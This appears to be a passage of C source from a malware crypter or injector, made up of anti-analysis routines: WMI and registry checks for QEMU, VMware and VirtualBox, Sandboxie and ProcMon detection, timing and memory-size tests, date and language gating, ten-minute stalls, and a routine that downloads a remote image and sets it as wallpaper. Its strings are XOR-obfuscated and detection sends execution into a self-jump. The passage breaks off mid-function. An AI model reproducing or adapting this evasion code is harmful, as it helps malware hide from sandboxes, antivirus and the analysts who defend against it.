    hr = services->lpVtbl->ExecQuery(services, language, query, WBEM_FLAG_BIDIRECTIONAL, NULL, &results);
    if (results != NULL) 
	{
        IWbemClassObject *result = NULL;
        ULONG returnedCount = 0;
        while((hr = results->lpVtbl->Next(results, WBEM_INFINITE, 1, &result, &returnedCount)) == S_OK) 
		{
            VARIANT caption;
            hr = result->lpVtbl->Get(result, widedecrypt("Zl{`heG|dkl{",12,9), 0, &caption, 0, 0); // SerialNumber,12,9
			char prop[256];
			wcstombs(prop,caption.bstrVal,SysStringByteLen(caption.bstrVal));
			
			char *vm1 = decrypted("UAIQ",4,4); // QEMU
			char *vm2 = decrypted("_D~h{l",6,9); // VMware
			char *vm3 = decrypted("pdi~",4,6); // vbox

			if(strstr(prop,vm1))
			{
		jumptoself_ASM();
			}

			if(strstr(prop,vm2))
			{
		jumptoself_ASM();
			}

			if(strstr(prop,vm3))
			{
		jumptoself_ASM();
			}
            result->lpVtbl->Release(result);
        }
    }
    results->lpVtbl->Release(results);
    services->lpVtbl->Release(services);
    locator->lpVtbl->Release(locator);
    CoUninitialize();
    SysFreeString(query);
    SysFreeString(language);
    SysFreeString(resource);
}

void anti_vm_wmi_3(void)
{
	HRESULT hr = 0;
    IWbemLocator         *locator  = NULL;
    IWbemServices        *services = NULL;
    IEnumWbemClassObject *results  = NULL;
    BSTR resource = SysAllocString(widedecrypt("YDD_WWHBF]9",11,11)); //  ROOT\\CIMV2,11,11
    BSTR language = SysAllocString(widedecrypt("Y_B",3,14)); // WQL,3,14
    BSTR query    = SysAllocString(widedecrypt("WAHAGP$.$BVKI$Smj76[GkitqpavW}wpai",34,4)); // SELECT * FROM Win32_ComputerSystem
	
    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    hr = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID *) &locator);
    hr = locator->lpVtbl->ConnectServer(locator, resource, NULL, NULL, NULL, 0, NULL, NULL, &services);
    hr = services->lpVtbl->ExecQuery(services, language, query, WBEM_FLAG_BIDIRECTIONAL, NULL, &results);
    if (results != NULL) 
	{
        IWbemClassObject *result = NULL;
        ULONG returnedCount = 0;
        while((hr = results->lpVtbl->Next(results, WBEM_INFINITE, 1, &result, &returnedCount)) == S_OK) 
		{
            VARIANT caption;
            hr = result->lpVtbl->Get(result, widedecrypt("Hja`i",5,5), 0, &caption, 0, 0); // model,5,5
			char prop[128];
			wcstombs(prop,caption.bstrVal,SysStringByteLen(caption.bstrVal));
			
			char *vm1 = decrypted("YME]",4,8); //QEMU
			char *vm2 = decrypted("QJpfub",6,7); // VMware
			char *vm3 = decrypted("ual{",4,3); // vbox
			
			if(strstr(prop,vm1))
			{
		jumptoself_ASM();
			}

			if(strstr(prop,vm2))
			{
		jumptoself_ASM();
			}

			if(strstr(prop,vm3))
			{
		jumptoself_ASM();
			}
            result->lpVtbl->Release(result);
        }
    }

    results->lpVtbl->Release(results);
    services->lpVtbl->Release(services);
    locator->lpVtbl->Release(locator);
    CoUninitialize();
    SysFreeString(query);
    SysFreeString(language);
    SysFreeString(resource);	
}

void anti_vm_wmi_4(void)
{
	HRESULT hr = 0;
    IWbemLocator         *locator  = NULL;
    IWbemServices        *services = NULL;
    IEnumWbemClassObject *results  = NULL;
    BSTR resource = SysAllocString(widedecrypt("YDD_WWHBF]9",11,11)); //  ROOT\\CIMV2,11,11
    BSTR language = SysAllocString(widedecrypt("Y_B",3,14)); // WQL,3,14
    BSTR query    = SysAllocString(widedecrypt("WAHAGP$.$BVKI$Smj76[GkitqpavW}wpai",34,4)); // SELECT * FROM Win32_ComputerSystem
	
    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    hr = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID *) &locator);
    hr = locator->lpVtbl->ConnectServer(locator, resource, NULL, NULL, NULL, 0, NULL, NULL, &services);
    hr = services->lpVtbl->ExecQuery(services, language, query, WBEM_FLAG_BIDIRECTIONAL, NULL, &results);
    if (results != NULL) 
	{
        IWbemClassObject *result = NULL;
        ULONG returnedCount = 0;
        while((hr = results->lpVtbl->Next(results, WBEM_INFINITE, 1, &result, &returnedCount)) == S_OK) 
		{
            VARIANT caption;
            hr = result->lpVtbl->Get(result, widedecrypt("Dhg|ohj}|{l{",12,9), 0, &caption, 0, 0); // Manufacturer,12,9
			char prop[128];
			wcstombs(prop,caption.bstrVal,SysStringByteLen(caption.bstrVal));
			
			char *vm1 = decrypted("YME]",4,8); //QEMU
			char *vm2 = decrypted("QJpfub",6,7); // VMware
			char *vm3 = decrypted("ual{",4,3); // vbox
			
			if(strstr(prop,vm1))
			{
		jumptoself_ASM();
			}

			if(strstr(prop,vm2))
			{
		jumptoself_ASM();
			}

			if(strstr(prop,vm3))
			{
		jumptoself_ASM();
			}
            result->lpVtbl->Release(result);
        }
    }
    results->lpVtbl->Release(results);
    services->lpVtbl->Release(services);
    locator->lpVtbl->Release(locator);
    CoUninitialize();
    SysFreeString(query);
    SysFreeString(language);
    SysFreeString(resource);	
}

void anti_vm_wmi_5(void)
{
	HRESULT hr = 0;
    IWbemLocator         *locator  = NULL;
    IWbemServices        *services = NULL;
    IEnumWbemClassObject *results  = NULL;
    BSTR resource = SysAllocString(widedecrypt("YDD_WWHBF]9",11,11)); //  ROOT\\CIMV2,11,11
    BSTR language = SysAllocString(widedecrypt("Y_B",3,14)); // WQL,3,14
    BSTR query    = SysAllocString(widedecrypt("YOFOI^* *LXEG*]cd98ULkd",23,10)); // SELECT * FROM Win32_Fan,23,10
	
    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    hr = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID *) &locator);
    hr = locator->lpVtbl->ConnectServer(locator, resource, NULL, NULL, NULL, 0, NULL, NULL, &services);
    hr = services->lpVtbl->ExecQuery(services, language, query, WBEM_FLAG_BIDIRECTIONAL, NULL, &results);
    	if (results != NULL) 
		{
        IWbemClassObject *result = NULL;
        ULONG returnedCount = 0;
        	while((hr = results->lpVtbl->Next(results, WBEM_INFINITE, 1, &result, &returnedCount)) == S_OK) 
			{
           	// fan present means we're on physical otherwise returns error below
       		}
    	}
		if(GetLastError() == 14007)
		{
jumptoself_ASM();
		}
    results->lpVtbl->Release(results);
    services->lpVtbl->Release(services);
    locator->lpVtbl->Release(locator);
    CoUninitialize();
    SysFreeString(query);
    SysFreeString(language);
    SysFreeString(resource);
}
void anti_vm_wmi_6(void)
{
	HRESULT hr = 0;
    IWbemLocator         *locator  = NULL;
    IWbemServices        *services = NULL;
    IEnumWbemClassObject *results  = NULL;
    BSTR resource = SysAllocString(widedecrypt("YDD_WWHBF]9",11,11)); //  ROOT\\CIMV2,11,11
    BSTR language = SysAllocString(widedecrypt("Y_B",3,14)); // WQL,3,14
    BSTR query    = SysAllocString(widedecrypt("TBKBDS'-'AUHJ'Pni45XSbjwbufsrubWuheb",36,7)); // SELECT * FROM Win32_TemperatureProbe,36,7

    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    hr = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID *) &locator);
    hr = locator->lpVtbl->ConnectServer(locator, resource, NULL, NULL, NULL, 0, NULL, NULL, &services);
    hr = services->lpVtbl->ExecQuery(services, language, query, WBEM_FLAG_BIDIRECTIONAL, NULL, &results);
    if (results != NULL) 
	{
        IWbemClassObject *result = NULL;
        ULONG returnedCount = 0;
        while((hr = results->lpVtbl->Next(results, WBEM_INFINITE, 1, &result, &returnedCount)) == S_OK) 
		{
			// if something returns we're on physical
		}
		if(GetLastError() == 14007)
		{
jumptoself_ASM();
		}
    }
    results->lpVtbl->Release(results);
    services->lpVtbl->Release(services);
    locator->lpVtbl->Release(locator);
    CoUninitialize();
    SysFreeString(query);
    SysFreeString(language);
    SysFreeString(resource);
}
void anti_vm_wmi_7(void)
{
	HRESULT hr = 0;
    IWbemLocator         *locator  = NULL;
    IWbemServices        *services = NULL;
    IEnumWbemClassObject *results  = NULL;
    BSTR resource = SysAllocString(widedecrypt("YDD_WWHBF]9",11,11)); //  ROOT\\CIMV2,11,11
    BSTR language = SysAllocString(widedecrypt("Y_B",3,14)); // WQL,3,14
    BSTR query    = SysAllocString(widedecrypt("V@I@FQ%/%CWJH%Rlk67ZUm|vlfdiH`hjw|",34,5)); // SELECT * FROM Win32_PhysicalMemory,34,5
	
    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    hr = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID *) &locator);
    hr = locator->lpVtbl->ConnectServer(locator, resource, NULL, NULL, NULL, 0, NULL, NULL, &services);
    hr = services->lpVtbl->ExecQuery(services, language, query, WBEM_FLAG_BIDIRECTIONAL, NULL, &results);
	
    if (results != NULL) 
	{
        IWbemClassObject *result = NULL;
        ULONG returnedCount = 0;
        while((hr = results->lpVtbl->Next(results, WBEM_INFINITE, 1, &result, &returnedCount)) == S_OK) 
		{
            VARIANT caption;
            hr = result->lpVtbl->Get(result, widedecrypt("Nbmveb`wvqfq",12,3), 0, &caption, 0, 0); // Manufacturer,12,3
			if(SysStringByteLen(caption.bstrVal) == 0)
			{
			//no data? must be a vm!
	jumptoself_ASM();
			}
			result->lpVtbl->Release(result);
        }
    }
    results->lpVtbl->Release(results);
    services->lpVtbl->Release(services);
    locator->lpVtbl->Release(locator);
    CoUninitialize();
    SysFreeString(query);
    SysFreeString(language);
    SysFreeString(resource);
}


int reg_enum_vm_check(void)
{
   HKEY hTestKey;
// with IDE on virtualbox
// (1) CdRomNECVMWar_VMware_IDE_CDR10_______________1.00____
// (2) DiskVMware_Virtual_IDE_Hard_Drive___________00000001
	// SYSTEM\\CurrentControlSet\\Enum\\IDE\\
	
   if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, decrypted("V\VQ@HYYFpww`kqFjkqwjiV`qYY@kphYYLA@YY",38,5), 0,
	 KEY_READ, &hTestKey) == ERROR_SUCCESS)
   	{
	TCHAR    achKey[MAX_KEY_LENGTH];
    DWORD    cbName;
    TCHAR    achClass[MAX_PATH] = TEXT("");
    DWORD    cchClassName = MAX_PATH;
    DWORD    cSubKeys=0;
    DWORD    cbMaxSubKey;
    DWORD    cchMaxClass;
    DWORD    cValues;    
    DWORD    cchMaxValue;
    DWORD    cbMaxValueData;
    DWORD    cbSecurityDescriptor;
    FILETIME ftLastWriteTime;     
    DWORD i, retCode; 
    retCode = RegQueryInfoKey(hTestKey, achClass, &cchClassName, NULL, &cSubKeys, &cbMaxSubKey,
    &cchMaxClass, &cValues, &cchMaxValue, &cbMaxValueData, &cbSecurityDescriptor, &ftLastWriteTime);
      if (cSubKeys)
      {
        for (i=0; i<cSubKeys; i++) 
        { 
            cbName = MAX_KEY_LENGTH;
            retCode = RegEnumKeyEx(hTestKey, i, achKey, &cbName, NULL, NULL, NULL, &ftLastWriteTime); 
            if (retCode == ERROR_SUCCESS) 
            {
                if(strstr(achKey,decrypted("^Eizm",6,8))) // VMware
				{
		jumptoself_ASM();
				}
				if(strstr(achKey,decrypted("T@HP",4,5))) // QEMU
				{
		jumptoself_ASM();
				}
				if(strstr(achKey,decrypted("|her",4,10))) // vbox
				{
				
		jumptoself_ASM();
				}
				
            }
        }
      } 
      
   	}
   
   RegCloseKey(hTestKey);
   
   if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, decrypted("RXRUDL]]BtssdouBnousnmRdu]]Dotl]]RBRH]]",39,1), 0,
	 KEY_READ, &hTestKey) == ERROR_SUCCESS) // TEXT("SYSTEM\\CurrentControlSet\\Enum\\SCSI\\")
   	{
	TCHAR    achKey[MAX_KEY_LENGTH];
    DWORD    cbName;
    TCHAR    achClass[MAX_PATH] = TEXT("");
    DWORD    cchClassName = MAX_PATH;
    DWORD    cSubKeys=0;
    DWORD    cbMaxSubKey;
    DWORD    cchMaxClass;
    DWORD    cValues;    
    DWORD    cchMaxValue;
    DWORD    cbMaxValueData;
    DWORD    cbSecurityDescriptor;
    FILETIME ftLastWriteTime;     
    DWORD i, retCode; 
    retCode = RegQueryInfoKey(hTestKey, achClass, &cchClassName, NULL, &cSubKeys, &cbMaxSubKey,
    &cchMaxClass, &cValues, &cchMaxValue, &cbMaxValueData, &cbSecurityDescriptor, &ftLastWriteTime);
      if (cSubKeys)
      {
        for (i=0; i<cSubKeys; i++) 
        { 
            cbName = MAX_KEY_LENGTH;
            retCode = RegEnumKeyEx(hTestKey, i, achKey, &cbName, NULL, NULL, NULL, &ftLastWriteTime); 
            if (retCode == ERROR_SUCCESS) 
            {
                if(strstr(achKey,decrypted("^Eizm",6,8))) // VMware
				{
		jumptoself_ASM();
				}
				if(strstr(achKey,decrypted("T@HP",4,5))) // QEMU
				{
		jumptoself_ASM();
				}
				if(strstr(achKey,decrypted("|her",4,10))) // vbox
				{
				
		jumptoself_ASM();
				}
				
            }
        }
      } 
      
   	}
	RegCloseKey(hTestKey);
	return 0;
}
// SMBIOSID aka return BasicWMIQuery("SELECT * FROM Win32_ComputerSystemProduct", "UUID");

// if ($uuid -eq "00000000-0000-0000-0000-000000000000")  { return

int AntiEmu(void)
{
	if(GetModuleHandle(decrypted("RchdEmm/emm",11,1)) !=0) // SbieDll.dll
	{
jumptoself_ASM();
	}
	DWORD ticks = GetTickCount();
	Sleep(702);
	DWORD ticks_test = GetTickCount();
	if((ticks_test - ticks) < 700)
	{
jumptoself_ASM();
	}
	return 0;
}

void special_usercheck(void)
{
	char user[128] = "";
	DWORD len = 128;
	GetUserName(user,&len);
	if(strstr(user,"Johnson"))
	{
	jumptoself_ASM();
	}
}

void JoeSpecial(void)
{
    char *libname = "vqonlm-goo"; // urlmon.dll,10,3
	char *funcname = "RUKChpikhfcShAnkbF"; // URLDownloadToFileA,18,7
	char *powerrangersbg = "jvvr8--koe27,fgtkclvcpv,lgv-350:-k-0232-070-`-0-qc`cl]rmugp]pclegpq]ucnnrcrgp]`{]qamvvcqn/f0{axsx,hre"; 
	// http://img05.deviantart.net/1728/i/2010/252/b/2/saban_power_rangers_wallpaper_by_scottasl-d2yczqz.jpg , 101,2
	char *bmp_bg = "a}}y3&&jfg}{`k$}lz}$`y'hgm{l~'jd|'lm|&y|k&zjlgl'f{n&n{hya`jz&h{}`z}z&{hz}hdfg&apf'kdy"; 
	// http://contrib-test-vip.andrew.cmu.edu/pub/scene.org/graphics/artists/rastamon/hyo.bmp , 86, 9 
	
typedef HRESULT (*_URLDownloadToFile) (LPUNKNOWN pCaller, LPCTSTR szURL, LPCTSTR szFileName, 
DWORD dwReserved, LPBINDSTATUSCALLBACK lpfnCB); _URLDownloadToFile GrabFile;
GrabFile = (_URLDownloadToFile)GetProcAddress(LoadLibrary(decrypted(libname,10,3)),decrypted(funcname,18,7));
OSVERSIONINFO osvi;
ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
GetVersionEx(&osvi);
    if(osvi.dwMajorVersion >= 6)
    {
			if (GrabFile(NULL, decrypted(powerrangersbg,101,2), 
			"%temp%\\bg.jpg", 0, NULL) == S_OK)
			{
			Sleep(500);
			SystemParametersInfo(0x14,3,"%temp%\\bg.jpg",0x01|0x02);
			}
	}
	else
	{
			if (GrabFile(NULL, decrypted(bmp_bg,86,9), 
			"%temp%\\lol.bmp", 0, NULL) == S_OK)
			{
			Sleep(500);
			SystemParametersInfo(0x14,3,"%temp%\\lol.bmp",0x01|0x02);
			}
		
	}
}

void MemSizeTrick(void)
{MEMORYSTATUSEX statex;
	statex.dwLength = sizeof (statex);
	GlobalMemoryStatusEx (&statex);
	DWORD biggun = (((statex.ullTotalPhys) / 1024) / 1024);
	
	if(biggun <= 2048)
	{
jumptoself_ASM();
	}
}
/*
void AnotherAntiDebugRoutine(void)
{
	_asm
	{
	blocStart:
	mov eax, blocStart
	mov ecx, blocEnd
	sub ecx, blocStart

	antiBpLoop:
	cmp byte [eax], bl
	jne continueLoop
	mov [eax], byte 0xEB

	continueLoop:
	inc eax
	dec ecx
	jnz antiBpLoop
	mov ecx, 0x02
	xor eax, eax
	jz valid
	db 0x02

	valid:
	db 0xCC
	db 0x02
	ret

	db 0x81
	sub ebx, 0xB4
	mov eax, [fs:ebx]
	add ebx, ebx
	mov eax, dword [eax + ebx]
	cmp byte [eax + ecx], ch
	pop ecx
	pop eax
	pop ebx
	je blocEnd
	db 0xEA

	blocEnd:
	}
}
*/


void AntiProcMon(void) // EXPIMENTAL. Detects if procmon has ever been run
{
	
	// \\\\.\\ProcmonDebugLogger, 25, 9
	CreateFile(decrypted("UUUU'UUY{fjdfgMlk|nEfnnl{",25,9), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0); 
	if(GetLastError() == 2)
	{
		return;
	}
	else
	{
jumptoself_ASM();
	}
	
return;
}

void date_specific_check(char *shortdate)
{
	time_t rawtime;
	struct tm * timeinfo;
  	char currentdate[80];

  	time (&rawtime);
  	timeinfo = localtime(&rawtime);
	strftime(currentdate,80,"%d/%m/%Y",timeinfo);
	
	//get current date, check against current month
	if(strstr(currentdate,shortdate))
	{
	// clean return
		return;
	}
	else{
jumptoself_ASM();
	}
}

void region_specific_check(char *region)
{
LANGID id;
char *lang = "";

	  id = GetSystemDefaultUILanguage();
	  switch(id)
	  {
		case 0x0000: lang = "Language Neutral"; break;
		case 0x007f: lang = "Locale Invariant"; break;
		case 0x0400: lang = "User Default Language"; break;
		case 0x0800: lang = "System Default Language"; break;
		case 0x0436: lang = "Afrikaans"; break;
		case 0x041c: lang = "Albanian"; break;
		case 0x0401: lang = "Arabic (Saudi Arabia)"; break;
		case 0x0801: lang = "Arabic (Iraq)"; break;
		case 0x0c01: lang = "Arabic (Egypt)"; break;
		case 0x1001: lang = "Arabic (Libya)"; break;
		case 0x1401: lang = "Arabic (Algeria)"; break;
		case 0x1801: lang = "Arabic (Morocco)"; break;
		case 0x1c01: lang = "Arabic (Tunisia)"; break;
		case 0x2001: lang = "Arabic (Oman)"; break;
		case 0x2401: lang = "Arabic (Yemen)"; break;
		case 0x2801: lang = "Arabic (Syria)"; break;
		case 0x2c01: lang = "Arabic (Jordan)"; break;
		case 0x3001: lang = "Arabic (Lebanon)"; break;
		case 0x3401: lang = "Arabic (Kuwait)"; break;
		case 0x3801: lang = "Arabic (U.A.E.)"; break;
		case 0x3c01: lang = "Arabic (Bahrain)"; break;
		case 0x4001: lang = "Arabic (Qatar)"; break;
		case 0x042b: lang = "Armenian"; break;
		case 0x042c: lang = "Azeri (Latin)"; break;
		case 0x082c: lang = "Azeri (Cyrillic)"; break;
		case 0x042d: lang = "Basque"; break;
		case 0x0423: lang = "Belarusian"; break;
		case 0x0402: lang = "Bulgarian"; break;
		case 0x0455: lang = "Burmese"; break;
		case 0x0403: lang = "Catalan"; break;
		case 0x0404: lang = "Chinese (Taiwan)"; break;
		case 0x0804: lang = "Chinese"; break;
		case 0x0c04: lang = "Chinese (Hong Kong)"; break;
		case 0x1004: lang = "Chinese (Singapore)"; break;
		case 0x1404: lang = "Chinese (Macau)"; break;
		case 0x041a: lang = "Croatian"; break;
		case 0x0405: lang = "Czech"; break;
		case 0x0406: lang = "Danish"; break;
		case 0x0465: lang = "Divehi"; break;
		case 0x0413: lang = "Dutch (Netherlands)"; break;
		case 0x0813: lang = "Dutch (Belgium)"; break;
		case 0x0409: lang = "English (United States)"; break;
		case 0x0809: lang = "English (United Kingdom)"; break;
		case 0x0c09: lang = "English (Australian)"; break;
		case 0x1009: lang = "English (Canadian)"; break;
		case 0x1409: lang = "English (New Zealand)"; break;
		case 0x1809: lang = "English (Ireland)"; break;
		case 0x1c09: lang = "English (South Africa)"; break;
		case 0x2009: lang = "English (Jamaica)"; break;
		case 0x2409: lang = "English (Caribbean)"; break;
		case 0x2809: lang = "English (Belize)"; break;
		case 0x2c09: lang = "English (Trinidad)"; break;
		case 0x3009: lang = "English (Zimbabwe)"; break;
		case 0x3409: lang = "English (Philippines)"; break;
		case 0x0425: lang = "Estonian"; break;
		case 0x0438: lang = "Faeroese"; break;
		case 0x0429: lang = "Farsi"; break;
		case 0x040b: lang = "Finnish"; break;
		case 0x040c: lang = "French (Standard)"; break;
		case 0x080c: lang = "French (Belgian)"; break;
		case 0x0c0c: lang = "French (Canadian)"; break;
		case 0x100c: lang = "French (Switzerland)"; break;
		case 0x140c: lang = "French (Luxembourg)"; break;
		case 0x180c: lang = "French (Monaco)"; break;
		case 0x0456: lang = "Galician"; break;
		case 0x0437: lang = "Georgian"; break;
		case 0x0407: lang = "German (Standard)"; break;
		case 0x0807: lang = "German (Switzerland)"; break;
		case 0x0c07: lang = "German (Austria)"; break;
		case 0x1007: lang = "German (Luxembourg)"; break;
		case 0x1407: lang = "German (Liechtenstein)"; break;
		case 0x0408: lang = "Greek"; break;
		case 0x0447: lang = "Gujarati"; break;
		case 0x040d: lang = "Hebrew"; break;
		case 0x0439: lang = "Hindi"; break;
		case 0x040e: lang = "Hungarian"; break;
		case 0x040f: lang = "Icelandic"; break;
		case 0x0421: lang = "Indonesian"; break;
		case 0x0410: lang = "Italian (Standard)"; break;
		case 0x0810: lang = "Italian (Switzerland)"; break;
		case 0x0411: lang = "Japanese"; break;
		case 0x044b: lang = "Kannada"; break;
		case 0x0457: lang = "Konkani"; break;
		case 0x0412: lang = "Korean"; break;
		case 0x0812: lang = "Korean (Johab)"; break;
		case 0x0440: lang = "Kyrgyz"; break;
		case 0x0426: lang = "Latvian"; break;
		case 0x0427: lang = "Lithuanian"; break;
		case 0x0827: lang = "Lithuanian (Classic)"; break;
		case 0x042f: lang = "Macedonian"; break;
		case 0x043e: lang = "Malay (Malaysian)"; break;
		case 0x083e: lang = "Malay (Brunei Darussalam)"; break;
		case 0x044e: lang = "Marathi"; break;
		case 0x0450: lang = "Mongolian"; break;
		case 0x0414: lang = "Norwegian (Bokmal)"; break;
		case 0x0814: lang = "Norwegian (Nynorsk)"; break;
		case 0x0415: lang = "Polish"; break;
		case 0x0416: lang = "Portuguese (Brazil)"; break;
		case 0x0816: lang = "Portuguese (Portugal)"; break;
		case 0x0446: lang = "Punjabi"; break;
		case 0x0418: lang = "Romanian"; break;
		case 0x0419: lang = "Russian"; break;
		case 0x044f: lang = "Sanskrit"; break;
		case 0x0c1a: lang = "Serbian (Cyrillic)"; break;
		case 0x081a: lang = "Serbian (Latin)"; break;
		case 0x041b: lang = "Slovak"; break;
		case 0x0424: lang = "Slovenian"; break;
		case 0x040a: lang = "Spanish (Spain, Traditional Sort)"; break;
		case 0x080a: lang = "Spanish (Mexican)"; break;
		case 0x0c0a: lang = "Spanish (Spain, International Sort)"; break;
		case 0x100a: lang = "Spanish (Guatemala)"; break;
		case 0x140a: lang = "Spanish (Costa Rica)"; break;
		case 0x180a: lang = "Spanish (Panama)"; break;
		case 0x1c0a: lang = "Spanish (Dominican Republic)"; break;
		case 0x200a: lang = "Spanish (Venezuela)"; break;
		case 0x240a: lang = "Spanish (Colombia)"; break;
		case 0x280a: lang = "Spanish (Peru)"; break;
		case 0x2c0a: lang = "Spanish (Argentina)"; break;
		case 0x300a: lang = "Spanish (Ecuador)"; break;
		case 0x340a: lang = "Spanish (Chile)"; break;
		case 0x380a: lang = "Spanish (Uruguay)"; break;
		case 0x3c0a: lang = "Spanish (Paraguay)"; break;
		case 0x400a: lang = "Spanish (Bolivia)"; break;
		case 0x440a: lang = "Spanish (El Salvador)"; break;
		case 0x480a: lang = "Spanish (Honduras)"; break;
		case 0x4c0a: lang = "Spanish (Nicaragua)"; break;
		case 0x500a: lang = "Spanish (Puerto Rico)"; break;
		case 0x0430: lang = "Sutu"; break;
		case 0x0441: lang = "Swahili (Kenya)"; break;
		case 0x041d: lang = "Swedish"; break;
		case 0x081d: lang = "Swedish (Finland)"; break;
		case 0x045a: lang = "Syriac"; break;
		case 0x0449: lang = "Tamil"; break;
		case 0x0444: lang = "Tatar (Tatarstan)"; break;
		case 0x044a: lang = "Telugu"; break;
		case 0x041e: lang = "Thai"; break;
		case 0x041f: lang = "Turkish"; break;
		case 0x0422: lang = "Ukrainian"; break;
		case 0x0420: lang = "Urdu (Pakistan)"; break;
		case 0x0820: lang = "Urdu (India)"; break;
		case 0x0443: lang = "Uzbek (Latin)"; break;
		case 0x0843: lang = "Uzbek (Cyrillic)"; break;
		case 0x042a: lang = "Vietnamese"; break;
    }
		if(strcmp(lang,region))
		{
			
			return;

		}
		else
		{
	jumptoself_ASM();
		}
	return;
}
/*
// moved to joecrypt_injecter.h
byte *decrypted(byte *data, int length, int crytptkey)
{	
	byte *out = (byte*)malloc(length+1);
	for(int x=0;x < length;x++)
	{
	out[x] = data[x] ^ crytptkey; 
	}
	return out;
}

WCHAR *widedecrypt(byte *data, int length, int crytptkey)
{	
	WCHAR *out = (WCHAR*)malloc(length+1);
	for(int x=0;x < length;x++)
	{
	out[x] = data[x] ^ crytptkey; 
	}
	return out;
}
*/
int timing_evasion_1(void)
{	
	DWORD joe_time_test1, joe_time_test2;
	joe_time_test1 = timeGetTime();
	Sleep(1000);
	joe_time_test2 = timeGetTime();
	if((joe_time_test2 > (joe_time_test1+ 1000))&&(joe_time_test2 < (joe_time_test1+ 1005)))
	{
		return 0;
	}
	else
	{
		ExitProcess(1);
		return 0;
	}
}

int timing_evasion_2(void)
{	
I_RpcPauseExecution(600000); // ten mins
int x = 0;
return x;
}

int timing_evasion_3(void)
{	
	char *libname  = "lvfnn,fnn"; // ntdll.dll,9,2
	char *funcname = "Jp@ahe}A|agqpmkj"; // NtDelayExecution,16,4
    HMODULE hDLL_ = LoadLibrary(decrypted(libname,9,2));
	if(hDLL_)
	{
	__int64 y = -6000000000; // 600 seconds or 10 mins
	FARPROC mydelay = GetProcAddress(hDLL_,decrypted(funcname,16,4));
	mydelay(FALSE,&y);
	}
int x = 1;

return x;
}

int timing_evasion_4(void)
{	
	HANDLE hIcmpFile;
    unsigned long destip = inet_addr("224.0.0.0");
	char SendData[9]; // random data
	DWORD kek = GetTickCount();
	sprintf(SendData,"%x",kek);
    LPVOID ReplyBuffer = NULL;
    DWORD ReplySize = 0;
    hIcmpFile = IcmpCreateFile();
    ReplySize = sizeof(ICMP_ECHO_REPLY) + sizeof(SendData);
    ReplyBuffer = (VOID*) malloc(ReplySize);
    IcmpSendEcho(hIcmpFile, destip, SendData, sizeof(SendData), NULL, ReplyBuffer, ReplySize, 600000);
	int x = 0;

	return x;
}
int timing_evasion_5(void)
{	
	HANDLE hIcmpFile;
    unsigned long destip = inet_addr("224.0.0.0");
	char SendData[9]; // random data
	DWORD kek = GetTickCount();
	sprintf(SendData,"%x",kek);
    LPVOID ReplyBuffer = NULL;
    DWORD ReplySize = 0;
    hIcmpFile = IcmpCreateFile();
    ReplySize = sizeof(ICMP_ECHO_REPLY) + sizeof(SendData);
    ReplyBuffer = (VOID*) malloc(ReplySize);
    IcmpSendEcho2(hIcmpFile, NULL, NULL, NULL, destip, SendData, sizeof(SendData), NULL, ReplyBuffer, ReplySize, 600000);
	int x = 0;

	return x;
}
int timing_evasion_6(void)
{	
	WSADATA wsa_Data;
	WSAStartup(0x101,&wsa_Data);
	char szHostName[255];
	gethostname(szHostName, 255);
	struct hostent *host_entry;
	host_entry=gethostbyname(szHostName);
	char *szLocalIP;
	szLocalIP = inet_ntoa (*(struct in_addr *)*host_entry->h_addr_list);
	WSACleanup();	    
    HANDLE hIcmpFile;
    unsigned long destip = inet_addr("224.0.0.0");
	unsigned long sourceip = inet_addr(szLocalIP); // needs IP of machine for this to work.
	char SendData[9]; // random data
	DWORD kek = GetTickCount();
	sprintf(SendData,"%x",kek);
    LPVOID ReplyBuffer = NULL;
    DWORD ReplySize = 0;
    hIcmpFile = IcmpCreateFile();
    ReplySize = sizeof(ICMP_ECHO_REPLY) + sizeof(SendData);
    ReplyBuffer = (VOID*) malloc(ReplySize);
   	IcmpSendEcho2Ex(hIcmpFile,NULL,NULL,NULL,sourceip,destip,SendData,sizeof(SendData),NULL,ReplyBuffer,ReplySize,600000); // 10 mins
	int x = 0;

	return x;
}
void CheckCoreCount(void)
{
	HANDLE proc;
	DWORD corecount;
	signed int bitpos;
	DWORD result;
	SYSTEM_INFO sysinf;
	ULONG_PTR ProcessAffinityMask;
	ULONG_PTR SystemAffinityMask;
	proc = GetCurrentProcess();
	if(GetProcessAffinityMask(proc,&ProcessAffinityMask,&SystemAffinityMask))
	{
		corecount = 0;
		bitpos = 0;
		do
		{
			if((1 << bitpos) & SystemAffinityMask)
				corecount++;
			bitpos++;
			
		}
